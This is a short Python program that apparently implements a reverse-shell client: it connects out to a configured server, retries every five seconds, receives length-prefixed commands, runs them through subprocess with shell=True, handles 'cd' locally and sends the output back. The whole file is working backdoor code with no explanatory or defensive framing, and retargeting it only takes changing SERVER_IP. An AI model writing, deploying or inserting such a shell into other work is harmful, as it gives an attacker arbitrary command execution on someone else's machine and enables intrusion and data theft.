import socket
import subprocess
import os
import shlex
import struct

SERVER_IP = '127.0.0.1'
SERVER_PORT = 9999

def connect():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((SERVER_IP, SERVER_PORT))
                print("[+] Successfully connected to the server.")
                command_loop(sock)
        except Exception as e:
            print(f"[!] Connection Error: {e}")
            import time
            time.sleep(5)

def send_msg(sock, data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    
    # Pack the ACTUAL length of the bytes
    header = struct.pack('!I', len(data))
    sock.sendall(header + data)

def receive_fixed_size(sock, size):
    data = b""
    while len(data) < size:
        try:
            packet = sock.recv(size - len(data))
            if not packet: return None
            data += packet
        except Exception as e:
            print(f"[!] Recv Error: {e}")
            return None
    return data

def execute_command(command):
    try:
        # Handle directory changes locally
        if command.startswith("cd "):
            path = command[3:].strip()
            os.chdir(os.path.expanduser(path))
            return os.getcwd().encode('utf-8')
        
        # Execute shell command
        result = subprocess.run(command, shell=True, capture_output=True, text=False, timeout=10)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e).encode('utf-8')

def command_loop(sock):
    while True:
        try:
            # 1. Send current working directory
            send_msg(sock, os.getcwd())

            # 2. Receive command
            header = receive_fixed_size(sock, 4)
            if not header: break
            
            command_length = struct.unpack('!I', header)[0]
            command_bytes = receive_fixed_size(sock, command_length)
            if not command_bytes: break
            
            command = command_bytes.decode('utf-8')

            # 3. Execute and send results
            output_bytes = execute_command(command)
            send_msg(sock, output_bytes)
            
        except Exception as e:
            print(f"[!] Loop Error: {e}")
            break

if __name__ == "__main__":
    connect()
